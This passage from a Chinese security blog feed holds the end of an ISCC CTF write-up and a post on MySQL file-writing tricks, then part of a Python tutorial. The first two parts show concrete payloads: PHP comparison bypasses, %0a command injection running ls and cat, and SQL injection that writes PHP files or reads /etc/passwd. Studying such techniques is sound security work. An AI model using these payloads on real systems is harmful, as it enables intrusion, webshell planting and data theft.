src="/2018/07/01/ISCC-writeup/1525695240838.png" alt="Alt text"><br>然后看注释又是index.php.txt,然后读源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">$flag = <span class="string">"***********"</span>;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]))&#123;</div><div class="line"><span class="keyword">if</span> (<span class="number">0</span> == strcasecmp($flag,$_GET[<span class="string">'username'</span>]))&#123;</div><div class="line">$a = fla;</div><div class="line"><span class="keyword">echo</span> <span class="string">"very good!Username is right"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">print</span> <span class="string">'Username is not right&lt;!--index.php.txt--&gt;'</span>;&#125;</div><div class="line">&#125;<span class="keyword">else</span></div><div class="line"><span class="keyword">print</span> <span class="string">'Please give me username or password!'</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]))&#123;</div><div class="line"><span class="keyword">if</span> (is_numeric($_GET[<span class="string">'password'</span>]))&#123;</div><div class="line"><span class="keyword">if</span> (strlen($_GET[<span class="string">'password'</span>]) &lt; <span class="number">4</span>)&#123;</div><div class="line"><span class="keyword">if</span> ($_GET[<span class="string">'password'</span>] &gt; <span class="number">999</span>)&#123;</div><div class="line">$b = g;</div><div class="line"><span class="keyword">print</span> <span class="string">'&lt;p&gt;very good!Password is right&lt;/p&gt;'</span>;</div><div class="line">&#125;<span class="keyword">else</span> </div><div class="line"><span class="keyword">print</span> <span class="string">'&lt;p&gt;Password too little&lt;/p&gt;'</span>;</div><div class="line">&#125;<span class="keyword">else</span></div><div class="line"><span class="keyword">print</span> <span class="string">'&lt;p&gt;Password too long&lt;/p&gt;'</span>;</div><div class="line">&#125;<span class="keyword">else</span></div><div class="line"><span class="keyword">print</span> <span class="string">'&lt;p&gt;Password is not numeric&lt;/p&gt;'</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> ($a.$b == <span class="string">"flag"</span>)</div><div class="line"><span class="keyword">print</span> $flag;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><p>分析一下，username还是用的strcmp判断的，然后password要求长度<4且数值>999，所以payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://118.190.152.202:8017/?username[]=&apos;admin&apos;&amp;password=9e9</div></pre></td></tr></table></figure></4且数值></p><p><img src="/2018/07/01/ISCC-writeup/1525696215252.png" alt="Alt text"></p><h3 id="请ping我的ip-看你能Ping通吗？"><a href="#请ping我的ip-看你能Ping通吗？" class="headerlink" title="请ping我的ip 看你能Ping通吗？"></a>请ping我的ip 看你能Ping通吗？</h3><p>开始完全不知道该怎么做，还是太菜了呀，py过后</p><p>在get方式下命令执行，过滤| 使用%0a绕过</p><p>查看当前目录<a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0als" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0als</a></p><p>查看源代码<a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acat%20index.php" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acat%20index.php</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"> &apos;&apos;,</div><div class="line">&apos;;&apos; =&gt; &apos;&apos;,</div><div class="line">&apos;|&apos; =&gt; &apos;&apos;,</div><div class="line">&apos;-&apos;  =&gt; &apos;&apos;,</div><div class="line">&apos;$&apos;  =&gt; &apos;&apos;,</div><div class="line">&apos;(&apos;  =&gt; &apos;&apos;,</div><div class="line">&apos;)&apos;  =&gt; &apos;&apos;,</div><div class="line">&apos;`&apos;  =&gt; &apos;&apos;,</div><div class="line">&apos;||&apos; =&gt; &apos;&apos;,</div><div class="line">);</div><div class="line"></div><div class="line"></div><div class="line">$target = str_replace( array_keys( $substitutions ), $substitutions, $target );</div><div class="line">    </div><div class="line"></div><div class="line"></div><div class="line">if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) &#123;</div><div class="line">// Windows</div><div class="line"></div><div class="line">$cmd = shell_exec( &apos;ping  &apos; . $target );</div><div class="line">&#125;</div><div class="line">else &#123;</div><div class="line">// *nix</div><div class="line">$cmd = shell_exec( &apos;ping  -c 1 &apos; . $target );</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">echo  &quot;</div><div class="line">&#123;$cmd&#125;</div><div class="line">&quot;;</div><div class="line"></div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure><p>查看根目录<a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0als" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0als</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805080036_137.png" alt=""></p><p>一个一个试查看flag在哪里 发现flag在/home/flag</p><p><a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0als" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0als</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805080045_61.png" alt=""></p><p><a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0acat%20flag" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0acat%20flag</a></p><h3 id="php是世界上最好的语言"><a href="#php是世界上最好的语言" class="headerlink" title="php是世界上最好的语言"></a>php是世界上最好的语言</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ISCC-WP&quot;&gt;&lt;a href=&quot;#ISCC-WP&quot; class=&quot;headerlink&quot; title=&quot;ISCC WP&quot;&gt;&lt;/a&gt;ISCC WP&lt;/h1&gt;&lt;h2 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://www.twosmi1e.com/tags/ctf/"/>
    
      <category term="wp" scheme="https://www.twosmi1e.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Mysql写入文件小技巧</title>
    <link href="https://www.twosmi1e.com/2018/02/10/Mysql%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    <id>https://www.twosmi1e.com/2018/02/10/Mysql写入文件小技巧/</id>
    <published>2018-02-10T15:03:01.000Z</published>
    <updated>2018-03-13T11:36:57.730Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-用UNION写入"><a href="#1-用UNION写入" class="headerlink" title="1.用UNION写入"></a>1.用UNION写入</h1><p>&nbsp;&nbsp;<a href="http://url/?id=1" target="_blank" rel="external">http://url/?id=1</a> and 0 union select 1,2 ,’&lt;?php phpinfo(); ?&gt;’ into dumpfile ‘文件绝对路径’<br><img src="http://t1.aixinxi.net/o_1c8fibdp316ln1hegq27nnvmeua.png-j.jpg" alt=""><br>&nbsp;&nbsp;采用常规的union写入，可以看到前面的字段占位数肯定也会被写入，替换成null也是一样的结果，这个对于写shell没啥大碍，<br>但是如果用来写bat,mof,vbs等文件就会出问题了，那么怎么去掉这个只写入我们需要的内容呢？采用hex编码就好了。<br><img src="http://t1.aixinxi.net/o_1c8fibvrb1ddf1l1p2ti16q4hu8a.png-j.jpg" alt=""><br>&nbsp;&nbsp;将我们要写入的内容使用hex编码在分段写在每个字段位上，这样就可以只写入我们需要的内容了。</p><h1 id="2-不支持union注入时-用terminated-by"><a href="#2-不支持union注入时-用terminated-by" class="headerlink" title="2.不支持union注入时 用terminated by"></a>2.不支持union注入时 用terminated by</h1><p>&nbsp;&nbsp;语法：select <em> from admin where id=1 into outfile ‘F:\WWW\phpinfo.php’ fields terminated by ‘&lt;? phpinfo(); ?&gt;’%23<br><img src="http://t1.aixinxi.net/o_1c7bt8hbmc5ev2a1tvt1gvh12jga.png-j.jpg" alt=""><br>&nbsp;&nbsp;可以看到成功写入，但是这个方法有一个弊病就是查询出来的数据必须大于或等于2以上才可以写入内容，写入的内容数=查询出来的数据-1<br>可以看到，当我们使前面的数据出错查不到数据的时候，写入是失败的。<br>看看sqlmap中的情况：<br><img src="http://t1.aixinxi.net/o_1c7btan3lvrq1f89ntd1n0562na.png-j.jpg" alt=""><br>&nbsp;&nbsp;可以很明显的看到sqlmap中也有这种办法写入。（burp抓取sqlmap数据包：加上 –proxy “<a href="http://127.0.0.1:8080/" target="_blank" rel="external">http://127.0.0.1:8080/</a>“; 在burp里可以看到请求）<br><img src="http://t1.aixinxi.net/o_1c7btd46a1k5rfab1bpee9u1asoa.png-j.jpg" alt=""><br>当然可以看到也通过了常规的union写入文件。<br>同时附上一个函数exp()。通过这个函数也可以读取文件，但是写文件只能写入一个内容为0的文件，这里就必须结合其他的漏洞利用了，如：文件覆盖之类的。<br>读文件：<br>select exp(~(select</em>from(select load_file(‘/etc/passwd’))a));<br>写文件：<br>select exp(~(select*from(select ‘hello’)a)) into outfile ‘C:/out.txt’;  //但是只能写一个0进去。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;1-用UNION写入&quot;&gt;&lt;a href=&quot;#1-用UNION写入&quot; class=&quot;headerlink&quot; title=&quot;1.用UNION写入&quot;&gt;&lt;/a&gt;1.用UNION写入&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&lt;a href=&quot;http://url/?id=1&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Python高级特性</title>
    <link href="https://www.twosmi1e.com/2018/02/02/Python%E9%AB%98%E7%BA%A7%E7%89%B9%E6%80%A7/"/>
    <id>https://www.twosmi1e.com/2018/02/02/Python高级特性/</id>
    <published>2018-02-02T13:11:53.000Z</published>
    <updated>2018-04-24T08:12:37.544Z</updated>
    
    <content type="html"><![CDATA[<h1 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h1><p>取list或者tuple的部分元素<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;L = [<span class="string">'Michael'</span>, <span class="string">'Sarah'</span>, <span class="string">'Tracy'</span>, <span class="string">'Bob'</span>, <span class="string">'Jack'</span>]</div></pre></td></tr></table></figure></p><p>取前3个元素，应该怎么做？笨办法：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;[L[<span class="number">0</span>], L[<span class="number">1</span>], L[<span class="number">2</span>]]</div><div class="line">[<span class="string">'Michael'</span>, <span class="string">'Sarah'</span>, <span class="string">'Tracy'</span>]</div></pre></td></tr></table></figure></p><p>取前3个元素，用一行代码就可以完成切片：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;L[<span class="number">0</span>:<span class="number">3</span>]</div><div class="line">[<span class="string">'Michael'</span>, <span class="string">'Sarah'</span>, <span class="string">'Tracy'</span>]</div></pre></td></tr></table></figure></p><p>L[0:3]表示，从索引0开始取，直到索引3为止，但不包括索引3。即索引0，1，2，正好是3个元素。<br>如果第一个索引是0，还可以省略：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;L[:<span class="number">3</span>]</div><div class="line">[<span class="string">'Michael'</span>, <span class="string">'Sarah'</span>, <span class="string">'Tracy'</span>]</div></pre></td></tr></table></figure></p><p>类似的，既然Python支持L[-1]取倒数第一个元素，那么它同样支持倒数切片，试试：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;L[<span class="number">-2</span>:][<span class="string">'Bob'</span>, <span class="string">'Jack'</span>]</div><div class="line">&gt;&gt;&gt;L[<span class="number">-2</span>:<span class="number">-1</span>][<span class="string">'Bob'</span>]</div></pre></td></tr></table></figure></p><p>记住倒数第一个元素的索引是-1。</p><p>切片操作十分有用。我们先创建一个0-99的数列：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;L = list(range(<span class="number">100</span>))</div><div class="line">&gt;&gt;&gt;L</div><div class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, ..., <span class="number">99</span>]</div></pre></td></tr></table></figure></p><p>可以通过切片轻松取出某一段数列。比如前10个数：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;L[:<span class="number">10</span>]</div><div class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</div></pre></td></tr></table></figure></p><p>后10个数：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;L[<span class="number">-10</span>:]</div></pre></td></tr></table></figure></p><p>前11-20个数：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;L[<span class="number">10</span>:<span class="number">20</span>]</div><div class="line">[<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>]</div></pre></td></tr></table></figure></p><p>前10个数，每两个取一个：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;L[:<span class="number">10</span>:<span class="number">2</span>]</div><div class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>]</div></pre></td></tr></table></figure></p><p>所有数，每5个取一个：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;L[::<span class="number">5</span>]</div><div class="line">[<span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">20</span>, <span class="number">25</span>, <span class="number">30</span>, <span class="number">35</span>, <span class="number">40</span>, <span class="number">45</span>, <span class="number">50</span>, <span class="number">55</span>, <span class="number">60</span>, <span class="number">65</span>, <span class="number">70</span>, <span class="number">75</span>, <span class="number">80</span>, <span class="number">85</span>, <span class="number">90</span>, <span class="number">95</span>]</div></pre></td></tr></table></figure></p><p>甚至什么都不写，只写[:]就可以原样复制一个list：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;L[:]</div><div class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, ..., <span class="number">99</span>]</div></pre></td></tr></table></figure></p><p>tuple也是一种list，唯一区别是tuple不可变。因此，tuple也可以用切片操作，只是操作的结果仍是tuple：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)[:<span class="number">3</span>]</div><div class="line">(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>)</div></pre></td></tr></table></figure></p><p>字符串’xxx’也可以看成是一种list，每个元素就是一个字符。因此，字符串也可以用切片操作，只是操作结果仍是字符串：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;<span class="string">'ABCDEFG'</span>[:<span class="number">3</span>]</div><div class="line"><span class="string">'ABC'</span></div><div class="line">&gt;&gt;&gt;<span class="string">'ABCDEFG'</span>[::<span class="number">2</span>]</div><div class="line"><span class="string">'ACEG'</span></div></pre></td></tr></table></figure></p><h1 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h1><p>如果给定一个list或tuple，我们可以通过for循环来遍历这个list或tuple，这种遍历我们称为迭代（Iteration）。<br>list这种数据类型虽然有下标，但很多其他数据类型是没有下标的，但是，只要是可迭代对象，无论有无下标，都可以迭代，比如dict就可以迭代：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;d = &#123;<span class="string">'a'</span>: <span class="number">1</span>, <span class="string">'b'</span>: <span class="number">2</span>, <span class="string">'c'</span>: <span class="number">3</span>&#125;</div><div class="line">&gt;&gt;&gt;<span class="keyword">for</span> key <span class="keyword">in</span> d:</div><div class="line"><span class="meta">... </span>    print(key)</div><div class="line">...</div><div class="line">a</div><div class="line">c</div><div class="line">b</div></pre></td></tr></table></figure></p><p>默认情况：dict迭代key<br><strong>for value in d.values()</strong>  迭代value<br><strong>for k, v in d.items()</strong>  同时迭代key和value<br>由于字符串也是可迭代对象，因此，也可以作用于for循环：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;<span class="keyword">for</span> ch <span class="keyword">in</span> <span class="string">'ABC'</span>:</div><div class="line"><span class="meta">... </span>    print(ch)</div><div class="line">...</div><div class="line">A</div><div class="line">B</div><div class="line">C</div></pre></td></tr></table></figure></p><p>只要作用于一个可迭代对象，for循环就可以正常运行，而我们不太关心该对象究竟是list还是其他数据类型。<br>通过collections模块的lterable类型判断<br>函数isinstance<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;<span class="keyword">from</span> collections <span class="keyword">import</span> Iterable</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>sinstance(<span class="string">'abc'</span>, Iterable) <span class="comment"># str是否可迭代</span></div><div class="line"><span class="keyword">True</span></div><div class="line">&gt;&gt;&gt;isinstance([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], Iterable) <span class="comment"># list是否可迭代</span></div><div class="line"><span class="keyword">True</span></div><div class="line">&gt;&gt;&gt;isinstance(<span class="number">123</span>, Iterable) <span class="comment"># 整数是否可迭代</span></div><div class="line"><span class="keyword">False</span></div></pre></td></tr></table></figure></p><p>如果要对list实现类似Java那样的下标循环怎么办？Python内置的enumerate函数可以把一个list变成索引-元素对，这样就可以在for循环中同时迭代索引和元素本身：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;<span class="keyword">for</span> i, value <span class="keyword">in</span> enumerate([<span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>]):</div><div class="line"><span class="meta">... </span>    print(i, value)</div><div class="line">...</div><div class="line"><span class="number">0</span> A</div><div class="line"><span class="number">1</span> B</div><div class="line"><span class="number">2</span> C</div></pre></td></tr></table></figure></p><p>上面的for循环里，同时引用了两个变量，在Python里是很常见的，比如下面的代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;<span class="keyword">for</span> x, y <span class="keyword">in</span> [(<span class="number">1</span>, <span class="number">1</span>), (<span class="number">2</span>, <span class="number">4</span>), (<span class="number">3</span>, <span class="number">9</span>)]:</div><div class="line"><span class="meta">... </span>    print(x, y)</div><div class="line">...</div><div class="line"><span class="number">1</span> <span class="number">12</span> <span class="number">43</span> <span class="number">9</span></div></pre></td></tr></table></figure></p><h1 id="列表生成式"><a href="#列表生成式" class="headerlink" title="列表生成式"></a>列表生成式</h1><p>List Comprehensions可以用来创建list的生成式<br>生成的元素 for in 范围 if 条件判断<br>要生成list [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]可以用list(range(1, 11))：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;list(range(<span class="number">1</span>, <span class="number">11</span>))</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]</div></pre></td></tr></table></figure></p><p>但如果要生成[1x1, 2x2, 3x3, …, 10x10]怎么做？方法一是循环：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;L = []</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">or</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">11</span>):</div><div class="line"><span class="meta">... </span>   L.append(x * x)</div><div class="line">...</div><div class="line">&gt;&gt;&gt;L</div><div class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>, <span class="number">100</span>]</div></pre></td></tr></table></figure></p><p>但是循环太繁琐，而列表生成式则可以用一行语句代替循环生成上面的list：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;[x * x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">11</span>)]</div><div class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>, <span class="number">100</span>]</div></pre></td></tr></table></figure></p><p>写列表生成式时，把要生成的元素x * x放到前面，后面跟for循环，就可以把list创建出来，十分有用，多写几次，很快就可以熟悉这种语法。<br>for循环后面还可以加上if判断，这样我们就可以筛选出仅偶数的平方：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;[x * x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">11</span>) <span class="keyword">if</span> x % <span class="number">2</span> == <span class="number">0</span>]</div><div class="line">[<span class="number">4</span>, <span class="number">16</span>, <span class="number">36</span>, <span class="number">64</span>, <span class="number">100</span>]</div></pre></td></tr></table></figure></p><p>还可以使用两层循环，可以生成全排列：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;[m + n <span class="keyword">for</span> m <span class="keyword">in</span> <span class="string">'ABC'</span> <span class="keyword">for</span> n <span class="keyword">in</span> <span class="string">'XYZ'</span>]</div><div class="line">[<span class="string">'AX'</span>, <span class="string">'AY'</span>, <span class="string">'AZ'</span>, <span class="string">'BX'</span>, <span class="string">'BY'</span>, <span class="string">'BZ'</span>, <span class="string">'CX'</span>, <span class="string">'CY'</span>, <span class="string">'CZ'</span>]</div></pre></td></tr></table></figure></p><p>for循环可以同时使用两个甚至多个变量， 比如dict的items（）<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;d = &#123;<span class="string">'x'</span>: <span class="string">'A'</span>, <span class="string">'y'</span>: <span class="string">'B'</span>, <span class="string">'z'</span>: <span class="string">'C'</span> &#125;</div><div class="line">&gt;&gt;&gt;<span class="keyword">for</span> k, v <span class="keyword">in</span> d.items():</div><div class="line"><span class="meta">... </span>    print(k, <span class="string">'='</span>, v)</div><div class="line">...</div><div class="line">y = B</div><div class="line">x = A</div><div class="line">z = C</div></pre></td></tr></table></figure></p><p>同时迭代key和value<br>源码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">L1 = [<span class="string">'Hello'</span>, <span class="string">'World'</span>, <span class="number">18</span>, <span class="string">'Apple'</span>, <span class="keyword">None</span>]</div><div class="line">L2 = [s.lower() <span class="keyword">for</span> s <span class="keyword">in</span> L1 <span class="keyword">if</span> isinstance(s, str)]</div><div class="line"><span class="keyword">print</span> (L2)</div></pre></td></tr></table></figure></p><h1 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h1><p>generator:生成器 一边循环一边计算<br>要创建一个generator，有很多种方法。第一种方法很简单，只要把一个列表生成式的[]改成()，就创建了一个generator：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;L = [x * x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>)]</div><div class="line">&gt;&gt;&gt;L</div><div class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>]</div><div class="line">&gt;&gt;&gt;g = (x * x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>))</div><div class="line">&gt;&gt;&gt;g</div><div class="line">&lt;generator object &lt;genexpr&gt; at <span class="number">0x1022ef630</span>&gt;</div></pre></td></tr></table></figure></p><p>创建L和g的区别仅在于最外层的[]和()，L是一个list，而g是一个generator。<br>通过next()函数获得generator的下一个返回值<br>没有更多的元素时抛出StopIteration的错误<br>要把fib函数变成generator，只需要把print(b)改为yield b就可以了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">(max)</span>:</span></div><div class="line">n, a, b = <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span></div><div class="line"><span class="keyword">while</span> n &lt; max:</div><div class="line"><span class="keyword">yield</span> b</div><div class="line">a, b = b, a + b</div><div class="line">n = n + <span class="number">1</span></div><div class="line"><span class="keyword">return</span> <span class="string">'done'</span></div></pre></td></tr></table></figure></p><p>#测试<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">f = fib(<span class="number">10</span>)</div><div class="line">print(<span class="string">'fib(10):'</span>, f)</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> f:</div><div class="line">print(x)</div></pre></td></tr></table></figure></p><p>如果一个函数定义中包含yield关键字，则这为generator<br>generator和函数的执行流程不一样。函数是顺序执行，遇到return语句或者最后一行函数语句就返回。而变成generator的函数，在每次调用next()的时候执行，遇到yield语句返回，再次执行时从上次返回的yield语句处继续执行。</p><p>我们在循环过程中不断调用yield，就会不断中断。当然要给循环设置一个条件来退出循环，不然就会产生一个无限数列出来。<br>同样的，把函数改成generator后，我们基本上从来不会用next()来获取下一个返回值，而是直接使用for循环来迭代：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div 